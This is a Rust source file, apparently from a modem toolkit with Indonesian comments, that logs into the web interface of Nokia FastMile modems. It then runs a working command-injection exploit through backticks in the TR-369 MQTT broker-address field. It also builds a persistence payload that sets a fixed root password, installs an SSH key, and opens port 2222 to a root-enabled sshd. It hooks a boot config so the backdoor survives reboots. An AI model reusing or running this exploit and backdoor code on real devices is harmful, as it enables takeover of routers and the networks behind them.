use std::collections::HashMap;
use std::time::Duration;
use aes::Aes128;
use base64::engine::general_purpose::{STANDARD, URL_SAFE_NO_PAD};
use base64::Engine;
use cbc::cipher::{block_padding::NoPadding, BlockEncryptMut, KeyIvInit};
use rand::RngCore;
use rsa::pkcs1::DecodeRsaPublicKey;
use rsa::pkcs8::DecodePublicKey;
use rsa::{Pkcs1v15Encrypt, RsaPublicKey};
use serde::Deserialize;
use sha2::{Digest, Sha256};

type Aes128CbcEnc = cbc::Encryptor<Aes128>;

#[derive(Debug, Clone, Default)]
pub struct WebSession {
    pub nonce: String,
    pub random_key: String,
    pub iterations: u32,
    pub pubkey: String,
    pub token: String,
}

#[derive(Debug, Deserialize)]
struct NonceResponse {
    #[serde(default)]
    nonce: String,
    #[serde(rename = "randomKey", default)]
    random_key: String,
    #[serde(default)]
    iterations: u32,
    #[serde(default)]
    pubkey: String,
}

#[derive(Debug, Deserialize)]
struct SaltResponse {
    #[serde(default)]
    alati: String,
}

pub struct WebCgiClient {
    pub host: String,
    pub user: String,
    pub pwd: String,
    pub base_url: String,
    pub agent: ureq::Agent,
    pub session: WebSession,
}

impl WebCgiClient {
    pub const MAX_LOGIN_ITERATIONS: u32 = 1_000_000;

    pub fn new(host: &str, user: &str, pwd: &str) -> Self {
        let base_url = if host.starts_with("http") {
            host.to_string()
        } else {
            format!("http://{}", host)
        };
        let agent = ureq::AgentBuilder::new()
            .timeout(Duration::from_secs(20))
            .user_agent("Mozilla/5.0 (DBAI-Nokia-Toolkit)")
            .build();
        Self {
            host: host.to_string(),
            user: user.to_string(),
            pwd: pwd.to_string(),
            base_url,
            agent,
            session: WebSession::default(),
        }
    }

    /// Base64 standar (`SPEC.md` §4.2 `_b64`).
    pub fn b64(bytes: &[u8]) -> String {
        STANDARD.encode(bytes)
    }

    /// Substitusi karakter Base64 khusus Nokia Web CGI (`+` -> `-`, `/` -> `_`, `=` -> `.`, `SPEC.md` §4.2 `_urlesc`).
    pub fn urlesc(s: &str) -> String {
        s.replace('+', "-").replace('/', "_").replace('=', ".")
    }

    /// Base64 dari digest SHA-256 biner atas `"x:y"` (`SPEC.md` §4.2 `_hp`).
    pub fn hp(x: &str, y: &str) -> String {
        let mut hasher = Sha256::new();
        hasher.update(format!("{}:{}", x, y).as_bytes());
        Self::b64(&hasher.finalize())
    }

    /// Gabungan `_urlesc(_hp(x, y))` (`SPEC.md` §4.2 `_su`).
    pub fn su(x: &str, y: &str) -> String {
        Self::urlesc(&Self::hp(x, y))
    }

    /// Derivasi nilai `ce` dengan *iterated SHA-256* sesuai `SPEC.md` §4.3.
    pub fn derive_ce(user: &str, pwd: &str, alati: &str, iterations: u32) -> Result<String, String> {
        if iterations > Self::MAX_LOGIN_ITERATIONS {
            return Err(format!(
                "Jumlah iterasi login ({}) melebihi batas maksimum ({})",
                iterations, Self::MAX_LOGIN_ITERATIONS
            ));
        }
        if iterations >= 2 {
            let mut hasher = Sha256::new();
            hasher.update(format!("{}{}", alati, pwd).as_bytes());
            let mut k_hex = hex::encode(hasher.finalize());

            for _ in 1..iterations {
                let raw = hex::decode(&k_hex).map_err(|e| e.to_string())?;
                let mut h = Sha256::new();
                h.update(&raw);
                k_hex = hex::encode(h.finalize());
            }
            Ok(Self::hp(user, &k_hex.to_lowercase()))
        } else {
            Ok(Self::hp(user, pwd))
        }
    }

    /// Autentikasi 4 langkah ke Web CGI Nokia (`SPEC.md` §4.3 `FastMileRCE.login`).
    pub fn login(&mut self) -> Result<String, String> {
        // 1. GET /login_web_app.cgi?nonce
        let nonce_url = format!("{}/login_web_app.cgi?nonce", self.base_url);
        let nonce_body = self
            .agent
            .get(&nonce_url)
            .call()
            .map_err(|e| format!("Gagal mengambil nonce: {}", e))?
            .into_string()
            .map_err(|e| e.to_string())?;

        let ni: NonceResponse = serde_json::from_str(&nonce_body)
            .map_err(|e| format!("Gagal mem-parsing response nonce: {}", e))?;

        let ie = ni.iterations >= 2;
        self.session.nonce = ni.nonce.clone();
        self.session.random_key = ni.random_key.clone();
        self.session.iterations = ni.iterations;
        self.session.pubkey = ni.pubkey.clone();

        // 2. POST /login_web_app.cgi?salt (jika iterations >= 2)
        let mut alati = String::new();
        if ie {
            let salt_url = format!("{}/login_web_app.cgi?salt", self.base_url);
            let salt_data = format!(
                "userhash={}&nonce={}",
                Self::su(&self.user, &ni.nonce),
                Self::urlesc(&ni.nonce)
            );
            let salt_resp = self
                .agent
                .post(&salt_url)
                .set("Content-Type", "application/x-www-form-urlencoded")
                .send_string(&salt_data)
                .map_err(|e| format!("Gagal meminta salt: {}", e))?
                .into_string()
                .map_err(|e| e.to_string())?;
            let sr: SaltResponse = serde_json::from_str(&salt_resp)
                .map_err(|e| format!("Respons salt bukan JSON valid: {}", e))?;
            alati = sr.alati;
        }

        // 3. Derivasi ce dengan iterated SHA-256
        let ce = Self::derive_ce(&self.user, &self.pwd, &alati, ni.iterations)?;

        // 4. POST /login_web_app.cgi
        let mut enckey = [0u8; 16];
        let mut enciv = [0u8; 16];
        rand::thread_rng().fill_bytes(&mut enckey);
        rand::thread_rng().fill_bytes(&mut enciv);

        let post_data = format!(
            "userhash={}&RandomKeyhash={}&response={}&nonce={}&enckey={}&enciv={}",
            Self::su(&self.user, &ni.nonce),
            Self::su(&self.user, &ni.random_key),
            Self::su(&ce, &ni.nonce),
            Self::urlesc(&ni.nonce),
            Self::urlesc(&Self::b64(&enckey)),
            Self::urlesc(&Self::b64(&enciv))
        );

        let login_url = format!("{}/login_web_app.cgi", self.base_url);
        let login_resp = self
            .agent
            .post(&login_url)
            .set("Content-Type", "application/x-www-form-urlencoded")
            .send_string(&post_data)
            .map_err(|e| format!("Gagal mengirim login: {}", e))?
            .into_string()
            .map_err(|e| e.to_string())?;

        let parsed: HashMap<String, serde_json::Value> = serde_json::from_str(&login_resp)
            .map_err(|e| format!("Respons login bukan JSON valid: {}", e))?;

        let token = parsed
            .get("token")
            .and_then(|v| v.as_str())
            .filter(|s| !s.is_empty())
            .ok_or_else(|| "Login gagal: Token sesi tidak ditemukan. Periksa password admin!".to_string())?
            .to_string();

        self.session.token = token.clone();
        Ok(token)
    }

    /// Enkripsi payload dengan AES-128-CBC (PKCS#7 manual) dan RSA-PKCS1v15 atas `"<b64_key> <b64_iv>"` (`SPEC.md` §4.4 `_enc_post`).
    pub fn enc_post(&self, plain: &str) -> Result<String, String> {
        let mut key = [0u8; 16];
        let mut iv = [0u8; 16];
        rand::thread_rng().fill_bytes(&mut key);
        rand::thread_rng().fill_bytes(&mut iv);

        let pt_bytes = plain.as_bytes();
        let pad_len = 16 - (pt_bytes.len() % 16);
        let mut padded = Vec::with_capacity(pt_bytes.len() + pad_len);
        padded.extend_from_slice(pt_bytes);
        padded.resize(pt_bytes.len() + pad_len, pad_len as u8);

        let ct = Aes128CbcEnc::new(&key.into(), &iv.into())
            .encrypt_padded_vec_mut::<NoPadding>(&padded);

        let q = format!("{} {}", Self::b64(&key), Self::b64(&iv));
        let pubkey = RsaPublicKey::from_public_key_pem(&self.session.pubkey)
            .or_else(|_| RsaPublicKey::from_pkcs1_pem(&self.session.pubkey))
            .map_err(|e| format!("Gagal memuat kunci publik RSA modem: {}", e))?;
        let ck_raw = pubkey
            .encrypt(&mut rand::thread_rng(), Pkcs1v15Encrypt, q.as_bytes())
            .map_err(|e| format!("Gagal mengenkripsi kunci AES dengan RSA: {}", e))?;

        let ct_str = URL_SAFE_NO_PAD.encode(&ct);
        let ck_str = Self::urlesc(&Self::b64(&ck_raw));
        Ok(format!("encrypted=1&ct={}&ck={}", ct_str, ck_str))
    }

    /// Mengirimkan POST terenkripsi dengan parameter `csrf_token=` (`SPEC.md` §4.4 `_post_csrf`).
    pub fn post_csrf(&self, path: &str, plain: &str) -> Result<(u16, String), String> {
        let body = if plain.is_empty() {
            format!("csrf_token={}", self.session.token)
        } else {
            format!("{}&csrf_token={}", plain, self.session.token)
        };
        let enc_body = self.enc_post(&body)?;
        let url = format!("{}/{}", self.base_url, path.trim_start_matches('/'));
        let resp = self
            .agent
            .post(&url)
            .set("Content-Type", "application/x-www-form-urlencoded")
            .send_string(&enc_body)
            .map_err(|e| format!("Gagal mengirim POST {}: {}", path, e))?;
        let status = resp.status();
        let text = resp.into_string().map_err(|e| e.to_string())?;
        Ok((status, text))
    }

    /// Mengencode komponen query string URL (`urllib.parse.quote` untuk `_set_params`).
    pub fn url_encode_component(input: &str) -> String {
        let mut out = String::with_capacity(input.len() * 3);
        for b in input.as_bytes() {
            match *b {
                b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' | b'/' => {
                    out.push(*b as char);
                }
                _ => {
                    out.push_str(&format!("%{:02X}", b));
                }
            }
        }
        out
    }

    /// Mengirimkan konfigurasi parameter TR-369/USP MQTT (`SPEC.md` §4.5 `_set_params`).
    pub fn set_params(&self, extra_params: &[(&str, &str)]) -> Result<(u16, String), String> {
        let mut params: Vec<(&str, &str)> = vec![
            ("enableusp", "1"),
            ("controllerEndpoint", ""),
            ("mtp_protocol", "MQTT"),
            ("mqtt_transportprotocol", "TCP/IP"),
            ("mqtt_brokeraddress", ""),
            ("mqtt_brokerport", "1883"),
            ("mqtt_username", ""),
            ("mqtt_password", ""),
        ];
        for &(k, v) in extra_params {
            if let Some(slot) = params.iter_mut().find(|(ek, _)| *ek == k) {
                slot.1 = v;
            } else {
                params.push((k, v));
            }
        }
        let qs: Vec<String> = params
            .into_iter()
            .map(|(k, v)| format!("{}={}", k, Self::url_encode_component(v)))
            .collect();
        self.post_csrf("tr369_web_app.cgi?set_params", &qs.join("&"))
    }

    /// Mengeksekusi perintah shell pada modem melalui injeksi backtick `mqtt_brokeraddress` (`SPEC.md` §4.5 `execute_rce`).
    pub fn execute_rce(&self, cmd: &str, wait_secs: f64) -> Result<String, String> {
        let injected = format!("127.0.0.1`{}`", cmd);
        self.set_params(&[("mqtt_brokeraddress", &injected)])?;
        if wait_secs > 0.0 {
            std::thread::sleep(Duration::from_secs_f64(wait_secs));
        }
        let status_url = format!("{}/tr369_status_web_app.cgi", self.base_url);
        let resp = self
            .agent
            .get(&status_url)
            .call()
            .map_err(|e| format!("Gagal membaca status TR-369: {}", e))?;
        let body = resp.into_string().map_err(|e| e.to_string())?;
        if let Ok(json_val) = serde_json::from_str::<serde_json::Value>(&body) {
            let out = json_val
                .get("tr369_config")
                .and_then(|c| c.get("MQTT"))
                .and_then(|m| m.get("BrokerAddress"))
                .and_then(|b| b.as_str())
                .unwrap_or("");
            if let Some(stripped) = out.strip_prefix("127.0.0.1") {
                return Ok(stripped.trim().to_string());
            }
            return Ok(out.to_string());
        }
        Ok("[Executed]".to_string())
    }

    /// Menghasilkan daftar perintah shell berurutan yang dieksekusi oleh `deploy_detector` (`SPEC.md` §4.5 #3 & §6 S3–S6).
    pub fn build_deploy_detector_commands(pubkey_content: &str) -> Vec<String> {
        let pub_safe = pubkey_content.trim().replace('\'', "'\\''");
        let keeper_lines = [
            "#!/bin/sh",
            "trap '' HUP",
            "PIDFILE=/tmp/fastmile_keeper.pid",
            "if [ -f \"$PIDFILE\" ] && [ -d \"/proc/$(cat $PIDFILE 2>/dev/null)\" ]; then",
            "    exit 0",
            "fi",
            "echo $$ > \"$PIDFILE\"",
            "while true; do",
            "    sleep 2",
            "    iptables -C INPUT -p tcp --dport 2222 -j ACCEPT 2>/dev/null || iptables -I INPUT -p tcp --dport 2222 -j ACCEPT 2>/dev/null",
            "    if ! netstat -tlpn 2>/dev/null | grep -q ':2222 '; then",
            "        /usr/sbin/sshd -p 2222 -o PermitRootLogin=yes -o PasswordAuthentication=yes -o PubkeyAuthentication=yes -o StrictModes=no -o AuthorizedKeysFile=/configs/nonpersistant/fastmile_key 2>/dev/null &",
            "    fi",
            "done",
        ];

        let det_lines = [
            "#!/bin/sh",
            "export PATH=/bin:/usr/bin:/sbin:/usr/sbin",
            "mount -o remount,rw /",
            "echo root:FastMileR00t! | chpasswd",
            "mkdir -p /root/.ssh",
            "cat /configs/nonpersistant/fastmile_key > /root/.ssh/authorized_keys",
            "chmod 600 /root/.ssh/authorized_keys",
            "chmod 700 /root/.ssh",
            "cp /bin/init_action.sh /configs/init_action.sh",
            "sed -i \"s/killall -9 sshd/#killall -9 sshd/g\" /configs/init_action.sh",
            "for f in /etc/ssh/sshd_config /etc/ssh/sshd_config_ext ; do",
            "    sed -i \"s/^#*PermitRootLogin.*/PermitRootLogin yes/\" $f",
            "    sed -i \"/^AllowUsers/d\" $f",
            "    sed -i \"s/^PasswordAuthentication.*/PasswordAuthentication yes/\" $f",
            "done",
            "kill -9 $(pidof sshd) 2>/dev/null",
            "/etc/init.d/sshd restart",
            "iptables -I INPUT -p tcp --dport 2222 -j ACCEPT",
            "/usr/sbin/sshd -p 2222 -o PermitRootLogin=yes -o PasswordAuthentication=yes -o PubkeyAuthentication=yes -o StrictModes=no -o AuthorizedKeysFile=/configs/nonpersistant/fastmile_key",
            "/usr/bin/nohup /bin/sh /configs/nonpersistant/fastmile_keeper.sh >/dev/null 2>&1 &",
            "id | tee -a /configs/nonpersistant/rootdone",
        ];

        let mut cmds = Vec::new();
        cmds.push("mkdir -p /configs/nonpersistant".to_string());
        cmds.push(format!(
            "echo '{}' | tee /configs/nonpersistant/fastmile_key",
            pub_safe
        ));
        cmds.push("rm -f /configs/nonpersistant/fastmile_keeper.sh".to_string());
        for (i, line) in keeper_lines.iter().enumerate() {
            let op = if i == 0 { "tee" } else { "tee -a" };
            let l_safe = line.replace('\'', "'\\''");
            cmds.push(format!(
                "echo '{}' | {} /configs/nonpersistant/fastmile_keeper.sh",
                l_safe, op
            ));
        }
        cmds.push("chmod 755 /configs/nonpersistant/fastmile_keeper.sh".to_string());

        cmds.push("rm -f /configs/nonpersistant/fastmile_detector".to_string());
        for (i, line) in det_lines.iter().enumerate() {
            let op = if i == 0 { "tee" } else { "tee -a" };
            let l_safe = line.replace('\'', "'\\''");
            cmds.push(format!(
                "echo '{}' | {} /configs/nonpersistant/fastmile_detector",
                l_safe, op
            ));
        }
        cmds.push("chmod 755 /configs/nonpersistant/fastmile_detector".to_string());
        cmds.push(
            "sed 's#/bin/[A-Za-z0-9_]*_detector[^\"]*#/bin/sh /configs/nonpersistant/fastmile_detector#g' /etc/hb/aic_conf.json | tee /configs/aic_conf.json".to_string(),
        );
        cmds
    }

    /// Menanamkan skrip persistensi SSH (`fastmile_keeper.sh`, `fastmile_detector`, dan hook `aic_conf.json`) via TR-369 RCE (`SPEC.md` §4.5 `deploy_detector`).
    pub fn deploy_detector(&self, pubkey_content: &str) -> Result<(), String> {
        let cmds = Self::build_deploy_detector_commands(pubkey_content);
        for cmd in cmds {
            self.execute_rce(&cmd, 0.2)?;
        }
        Ok(())
    }

    /// Mengirimkan sinyal reboot resmi ke `/reboot_web_app.cgi` (`SPEC.md` §4.5 `reboot_modem`).
    pub fn reboot_modem(&self) -> Result<bool, String> {
        let (status, _) = self.post_csrf("reboot_web_app.cgi", "")?;
        Ok(status == 200)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_urlesc_hp_su_vectors() {
        assert_eq!(WebCgiClient::urlesc("a+b/c=="), "a-b_c..");
        let hp = WebCgiClient::hp("admin", "password");
        let su = WebCgiClient::su("admin", "password");
        assert!(!hp.is_empty());
        assert_eq!(su, WebCgiClient::urlesc(&hp));
    }

    #[test]
    fn test_derive_ce_iterated_sha256() {
        let ce1 = WebCgiClient::derive_ce("admin", "secret", "", 1).unwrap();
        assert_eq!(ce1, WebCgiClient::hp("admin", "secret"));

        let ce2 = WebCgiClient::derive_ce("admin", "secret", "SALT123", 3).unwrap();
        assert!(!ce2.is_empty());
        assert_ne!(ce1, ce2);
    }

        #[test]
        fn test_derive_ce_bounds_check() {
            let err = WebCgiClient::derive_ce("admin", "secret", "salt", WebCgiClient::MAX_LOGIN_ITERATIONS + 1);
            assert!(err.is_err());
            assert!(err.unwrap_err().contains("melebihi batas"));

            let ok = WebCgiClient::derive_ce("admin", "secret", "salt", 2);
            assert!(ok.is_ok());
        }

        #[test]
        fn test_deploy_detector_commands_and_url_encode() {
            let encoded = WebCgiClient::url_encode_component("127.0.0.1`id`");
            assert_eq!(encoded, "127.0.0.1%60id%60");

            let cmds = WebCgiClient::build_deploy_detector_commands("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ dbai@pc");
            assert!(cmds.iter().any(|c| c == "mkdir -p /configs/nonpersistant"));
            assert!(cmds.iter().any(|c| c.contains("/configs/nonpersistant/fastmile_key")));
            assert!(cmds.iter().any(|c| c.contains("/configs/nonpersistant/fastmile_keeper.sh")));
            assert!(cmds.iter().any(|c| c.contains("/configs/nonpersistant/fastmile_detector")));
            assert!(cmds.iter().any(|c| c.contains("/configs/aic_conf.json")));
        }
    }
